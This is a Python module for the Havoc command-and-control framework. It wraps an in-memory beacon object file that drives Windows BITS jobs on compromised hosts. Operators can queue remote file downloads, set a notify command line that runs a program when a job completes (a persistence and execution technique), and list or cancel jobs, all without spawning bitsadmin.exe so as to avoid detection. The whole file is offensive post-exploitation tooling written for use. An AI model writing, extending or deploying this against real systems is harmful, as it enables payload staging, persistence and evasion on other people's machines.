"""
Bitsadmin — Havoc BOF wrapper for BITS via COM (no bitsadmin.exe).

Command names match bitsadmin.exe. The Python side parses the CLI and
packs a mode + args; the BOF talks to IBackgroundCopyManager.

Wire: Packer int(mode) then command-specific strings/ints.
BOF:  client/Modules/Bitsadmin/bin/bitsadmin.x64.o

To load: add this file to client/config.toml → [scripts].files
         (not done here on purpose — do not touch other modules).
"""

from havoc import Demon, RegisterCommand

BOF_PATH = "bin/bitsadmin.x64.o"

USAGE = (
    "USAGE: BITSADMIN command\n"
    "\n"
    "  bitsadmin /create [/download | /upload | /upload-reply] <display_name>\n"
    "  bitsadmin /addfile <job> <remote_url> <local_name>\n"
    "  bitsadmin /SetNotifyCmdLine <job> <program_name> [program_parameters]\n"
    "  bitsadmin /resume <job>\n"
    "  bitsadmin /list [/ALLUSERS] [/VERBOSE]\n"
    "  bitsadmin /cancel <job>\n"
    "  bitsadmin /complete <job>\n"
    "  bitsadmin /SetPriority <job> FOREGROUND|HIGH|NORMAL|LOW\n"
    "  bitsadmin /SetMinRetryDelay <job> <seconds>\n"
    "\n"
    "Job may be a display name or a {GUID}. No bitsadmin.exe is spawned."
)

MODE_CREATE   = 0
MODE_ADDFILE  = 1
MODE_NOTIFY   = 2
MODE_RESUME   = 3
MODE_LIST     = 4
MODE_CANCEL   = 5
MODE_COMPLETE = 6
MODE_PRIORITY = 7
MODE_RETRY    = 8

PRIORITY = {
    "foreground": 0,
    "high":       1,
    "normal":     2,
    "low":        3,
}


def _flag(s):
    return (s or "").lower()


def _is_null(s):
    return s is None or s == "" or s.upper() == "NULL"


def bitsadmin_cmd(demonID, *params):
    demon = Demon(demonID)

    if demon.ProcessArch == "x86":
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "bitsadmin BOF is x64-only")
        return False

    if len(params) < 1:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, USAGE)
        return False

    cmd = _flag(params[0])
    packer = Packer()
    task = None

    if cmd == "/create":
        rest = list(params[1:])
        job_type = 0
        if rest and _flag(rest[0]) in ("/download", "/upload", "/upload-reply"):
            t = _flag(rest.pop(0))
            if t == "/upload":
                job_type = 1
            elif t == "/upload-reply":
                job_type = 2
        if len(rest) < 1:
            demon.ConsoleWrite(demon.CONSOLE_ERROR,
                               "Usage: bitsadmin /create [/download | /upload | /upload-reply] <display_name>")
            return False
        name = rest[0]
        kind = ("DOWNLOAD", "UPLOAD", "UPLOAD-REPLY")[job_type]
        packer.addint(MODE_CREATE)
        packer.addint(job_type)
        packer.addstr(name)
        task = f"Tasked demon: bitsadmin /create /{kind.lower()} {name}"

    elif cmd == "/addfile":
        if len(params) < 4:
            demon.ConsoleWrite(demon.CONSOLE_ERROR,
                               "Usage: bitsadmin /addfile <job> <remote_url> <local_name>")
            return False
        job, remote, local = params[1], params[2], params[3]
        packer.addint(MODE_ADDFILE)
        packer.addstr(job)
        packer.addstr(remote)
        packer.addstr(local)
        task = f"Tasked demon: bitsadmin /addfile {job} {remote} {local}"

    elif cmd == "/setnotifycmdline":
        if len(params) < 3:
            demon.ConsoleWrite(demon.CONSOLE_ERROR,
                               "Usage: bitsadmin /SetNotifyCmdLine <job> <program_name> [program_parameters]")
            return False
        job = params[1]
        program = "" if _is_null(params[2]) else params[2]
        extra = params[3:]
        if extra and len(extra) == 1 and _is_null(extra[0]):
            arguments = ""
        else:
            arguments = " ".join(extra)
        packer.addint(MODE_NOTIFY)
        packer.addstr(job)
        packer.addstr(program)
        packer.addstr(arguments)
        shown_prog = program if program else "NULL"
        shown_args = arguments if arguments else "NULL"
        task = f"Tasked demon: bitsadmin /SetNotifyCmdLine {job} {shown_prog} {shown_args}"

    elif cmd == "/resume":
        if len(params) < 2:
            demon.ConsoleWrite(demon.CONSOLE_ERROR, "Usage: bitsadmin /resume <job>")
            return False
        job = params[1]
        packer.addint(MODE_RESUME)
        packer.addstr(job)
        task = f"Tasked demon: bitsadmin /resume {job}"

    elif cmd == "/list":
        flags = 0
        for a in params[1:]:
            f = _flag(a)
            if f == "/verbose":
                flags |= 1
            elif f == "/allusers":
                flags |= 2
            else:
                demon.ConsoleWrite(demon.CONSOLE_ERROR,
                                   "Usage: bitsadmin /list [/ALLUSERS] [/VERBOSE]")
                return False
        packer.addint(MODE_LIST)
        packer.addint(flags)
        extra = []
        if flags & 2:
            extra.append("/ALLUSERS")
        if flags & 1:
            extra.append("/VERBOSE")
        task = "Tasked demon: bitsadmin /list" + ((" " + " ".join(extra)) if extra else "")

    elif cmd == "/cancel":
        if len(params) < 2:
            demon.ConsoleWrite(demon.CONSOLE_ERROR, "Usage: bitsadmin /cancel <job>")
            return False
        job = params[1]
        packer.addint(MODE_CANCEL)
        packer.addstr(job)
        task = f"Tasked demon: bitsadmin /cancel {job}"

    elif cmd == "/complete":
        if len(params) < 2:
            demon.ConsoleWrite(demon.CONSOLE_ERROR, "Usage: bitsadmin /complete <job>")
            return False
        job = params[1]
        packer.addint(MODE_COMPLETE)
        packer.addstr(job)
        task = f"Tasked demon: bitsadmin /complete {job}"

    elif cmd == "/setpriority":
        if len(params) < 3:
            demon.ConsoleWrite(demon.CONSOLE_ERROR,
                               "Usage: bitsadmin /SetPriority <job> FOREGROUND|HIGH|NORMAL|LOW")
            return False
        job = params[1]
        raw = params[2].lower()
        if raw in PRIORITY:
            prio = PRIORITY[raw]
        elif raw.isdigit() and int(raw) in (0, 1, 2, 3):
            prio = int(raw)
        else:
            demon.ConsoleWrite(demon.CONSOLE_ERROR,
                               "Priority must be FOREGROUND, HIGH, NORMAL, or LOW")
            return False
        packer.addint(MODE_PRIORITY)
        packer.addstr(job)
        packer.addint(prio)
        task = f"Tasked demon: bitsadmin /SetPriority {job} {params[2].upper()}"

    elif cmd == "/setminretrydelay":
        if len(params) < 3:
            demon.ConsoleWrite(demon.CONSOLE_ERROR,
                               "Usage: bitsadmin /SetMinRetryDelay <job> <seconds>")
            return False
        job = params[1]
        try:
            seconds = int(params[2])
        except ValueError:
            demon.ConsoleWrite(demon.CONSOLE_ERROR, "seconds must be an integer")
            return False
        if seconds < 0:
            demon.ConsoleWrite(demon.CONSOLE_ERROR, "seconds must be >= 0")
            return False
        packer.addint(MODE_RETRY)
        packer.addstr(job)
        packer.addint(seconds)
        task = f"Tasked demon: bitsadmin /SetMinRetryDelay {job} {seconds}"

    else:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, USAGE)
        return False

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, task)
    demon.InlineExecute(TaskID, "go", BOF_PATH, packer.getbuffer(), False)
    return TaskID


RegisterCommand(
    bitsadmin_cmd,
    "",
    "bitsadmin",
    "BITS job control via COM (no bitsadmin.exe) — /create /addfile /SetNotifyCmdLine /resume /list /cancel /complete /SetPriority /SetMinRetryDelay",
    0,
    "/create [/download|/upload|/upload-reply] <name> | /addfile <job> <url> <local> | /SetNotifyCmdLine <job> <program> [params] | /resume <job> | /list [/ALLUSERS] [/VERBOSE] | /cancel <job> | /complete <job> | /SetPriority <job> <prio> | /SetMinRetryDelay <job> <seconds>",
    "/create /download updater"
)
